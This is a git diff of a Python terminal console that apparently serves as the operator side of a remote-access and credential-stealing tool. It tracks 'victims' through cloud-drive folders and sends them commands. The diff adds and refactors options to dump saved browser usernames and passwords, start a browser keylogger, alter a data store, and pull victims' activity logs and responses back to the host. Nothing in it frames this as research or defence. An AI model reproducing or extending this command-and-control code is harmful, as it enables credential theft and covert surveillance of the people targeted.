@@ -165,8 +165,8 @@ class Home:
             
             ord('s'):self.secure,
             ord('S'):self.secure,
-            ord("r"):self.refresh,
-            ord("R"):self.refresh,
+            # ord("r"):self.refresh,
+            # ord("R"):self.refresh,
             
             ord("\n"):self.enter,
             curses.KEY_ENTER:self.enter,
@@ -394,16 +394,15 @@ class Home:
         ]
         if full:
             _s="press 's' to turn (on-off) token_provider"
-            _s+=" and 'r' to refresh vic list"
+            # _s+=" and 'r' to refresh vic list"
             status.append(_s)
 
         middle_print_lst(status_bar, status, 1)
         status_bar.refresh()
 
-    def refresh(self):
-        victims.clear()
-        if _d.secure_mod:
-            name_lst=drive.list_folder(join(vic_path, bf_name))
+    def refresh(self):# auto refresh
+        if _d.secure_mod:# list offline
+            name_lst=drive.list_files(join(vic_path, bf_name))
             victims.extend(name_lst)
 
             if not name_lst:
@@ -413,20 +412,26 @@ class Home:
             
             self.resize()
             return
-
-        victims.extend(drive.list_folder(vic_path))# list host drive first
-        lst = source_drive.list_folder(vic_path)# list source drive
-        log.info(f'got {len(lst)} new victims.')
+    
+        lst = source_drive.list_files(vic_path)# list source drive
         if not lst:
             return
-
-        victims.extend(lst)
-        victims.remove('old')
+        log.info(f'auto refresh found {len(lst)} new active victims.')
         
-        # func move all file on a folders from source to host
-        for i in source_drive.list_folder(vic_path):
+        lst=set(victims)|set(lst)
+        victims.clear()
+        victims.extend(lst)
+        
+        # move registered file to the host
+        for i in lst:
             move_file(join(vic_path, i))
         
+        # move files that uploaded when ever a victims got actime
+        for user in victims:
+            file = "activity.log"
+            file = f"reports/{user}/{file}"
+            move_file(file)
+
         self.resize()
     
     def secure(self):
@@ -446,34 +451,50 @@ home_page=Home()
 
 
 modify_command=Lock()# accure while modifying command_file or listen_for
+def remove_command(uname, ctime):
+    '''
+        remove the respective command from command file
+        uname:str = victim_user_name
+        ctime:str or int = command_(secquence or id or time)
+    '''
+    ctime=str(ctime)
+    modify_command.acquire()
+    with drive_file(command_file) as f:
+        commands:list = json.loads(f.read())[uname]
+    
+    for command in commands:
+        if command['time']==ctime:
+            commands.remove(command)
+            break
+    else:
+        log.debug(f'listd command({uname}-{ctime}) already removed')
+        modify_command.release()
+        return
+
+    with drive_file(command_file) as f:
+        f.rewrite(commands)
+    modify_command.release()
+
 def listener():
     while 1:
+        home_page.refresh()
+        for user in victims:
+            response=join(user, 'response')
+            for ctime in source_drive.list_files(response):
+                remove_command(uname, ctime)
+                move_file(join(response, ctime))
+
         for i in listen_for:
             if not source_drive.exists(i):
-                sleep(2)
                 continue
 
-            log.info(f'file listener found a file. "{i}"')
-            move_file(i)
-            
-            # remove the respective command from command file
             uname=split(split(i)[0])[1]
             ctime=re.search(r"\d+", i).group() # command time
-            modify_command.acquire()
-
-            with drive_file(command_file) as f:
-                commands:list = json.loads(f.read())[uname]
+            log.info(f'file listener found a file from victim "{uname}" ')
+            log.debug(f'full file path: {i}')
             
-            for command in commands:
-                if command['time']==ctime:
-                    commands.remove(command)
-                    break
-            
-            with drive_file(command_file) as f:
-                f.rewrite(commands)
-            
-            modify_command.release()
-        
+            move_file(i)
+            remove_command(uname, ctime)
 
         sleep(10)
 
@@ -499,12 +520,12 @@ class Tokener:
             return
 
         log.info('stoping token rovider')
-        with drive_file(token_file) as f:
+        with drive_file(token_file) as f:# clean the token file
             f.rewrite("")
         force_stop(self.core)
         force_stop(self.listen)
         
-        for file in drive.list_folder(vic_path):# backup all file
+        for file in drive.list_files(vic_path):# backup registered victimes name
             backup(file)
         
         _d.secure_mod=True
@@ -525,6 +546,7 @@ class Tokener:
         token=self.tokens.get()
         log.debug('token received from the bucket')
         if _d.secure_mod:
+            log.info("auto refresh activated. please wait for the victims to register their names.")
             self.listen.start()
             _d.secure_mod=False
         
@@ -631,16 +653,6 @@ class Option_view:
     def exit(self):
         pass
 
-
-all_command=OrderedDict(
-    {
-        "dump": [None, 'Dump saved user names and password from browsers. [reports: dump_(time).json]'],
-        "stored_value": [None, 'check all the key-value stored in data_store. [reports: data_store_(time).json]'],
-        "set_value": [None, "change a value of stored key in data_store."],
-        "start_logger": [None, 'start a browser spacefic key logger.[reports: key_dump_(time).log]']
-    }
-)
-
 class Multi_opt(Option_view):
     def __init__(self, opt_lst, opt_win=window):
         self.selected=[]
@@ -726,17 +738,15 @@ class action:
         
         del opt_box, des_box
 
-        all_command=OrderedDict(
-            {
-                "dump": [self.dump, 'Dump saved user names and password from browsers. [reports: dump_(time).json]'],
-                "stored_value": [self.stored_value, 'check all the key-value stored in data_store. [reports: data_store_(time).json]', ],
-                "set_value": [self.set_value, "change a value of stored key in data_store.", ],
-                "start_logger": [self.start_logger, 'start a browser spacefic key logger.[reports: key_dump.log]', ],
-                "discard": [self.commands.clear, "discard staged commands."],
-                "clean_recoed":[self.clean_record, "remove user name with all listed commands from command file."]
-            }
-        )
-        opt_viewer=Option_view(all_command, opt_win)
+        self.all_command=OrderedDict({
+            "dump": [self.dump, 'Dump saved user names and password from browsers. [reports: dump_(time).json]'],
+            "stored_value": [self.stored_value, 'check all the key-value stored in data_store. [reports: data_store_(time).json]', ],
+            "set_value": [self.set_value, "change a value of stored key in data_store.", ],
+            "start_logger": [self.start_logger, 'start a browser spacefic key logger.[reports: key_dump.log]', ],
+            "discard": [self.discard, "discard staged commands."],
+            "clean_recoed":[self.clean_record, "remove user name with all listed commands from command file."]
+        })
+        opt_viewer=Option_view(self.all_command, opt_win)
         opt_viewer.on_selection=self.print_des
         opt_viewer.exit=self.commit
         opt_viewer.show()
@@ -744,7 +754,7 @@ class action:
 
     def print_des(self, opt):
         self.des_win.clear()
-        middle_print_str(self.des_win, all_command[opt][1])
+        middle_print_str(self.des_win, self.all_command[opt][1])
         self.des_win.refresh()
 
 
@@ -757,7 +767,7 @@ class action:
 
     def stored_value(self):
         command={
-            "func":"start_logger"
+            "func":"stored_value"
         }
         sec = self.stage(command)
         self.add_to_listen(f'data_store_{sec}.json')
@@ -802,8 +812,9 @@ class action:
         }
         
         self.stage(command)
-        if key=="last_user_time":# this must be happen after staging
-            self.last_time=int(p)
+        # this might create proablem depending on it's position during execution
+        # if key=="last_user_time":# this must be happen after staging
+        #     self.last_time=int(p)
         clear()
 
     def start_logger(self):
@@ -830,8 +841,13 @@ class action:
         self.add_to_listen(f'key_dump_{sec}.log')
         clear()
 
-    def clean_record(self):
+    def discard(self):
+        log.warning('all changes resolved.')
         self.commands.clear()
+
+    def clean_record(self):
+        log.warning('all listed commands removed from the command file\
+         but it doesn\'t discard the staged commands.')
         with drive_file(command_file) as f, modify_command:
             
             full_com:dict=json.loads(f.read() or "{}")
@@ -880,7 +896,7 @@ class action:
         return self.last_time
     
     def commit(self):
-        log.info("puhing all the staged commands.")
+        log.info("puhing all the staged commands. please wait")
         if not self.commands:
             return
 
@@ -913,9 +929,3 @@ if __name__=="__main__":
     # p=user_input()
     # print(p)
     
-
-    # print_in_middle(window, all_command, 2)
-    # window.refresh()
-    # sleep(3)
-    # window.getch()
-
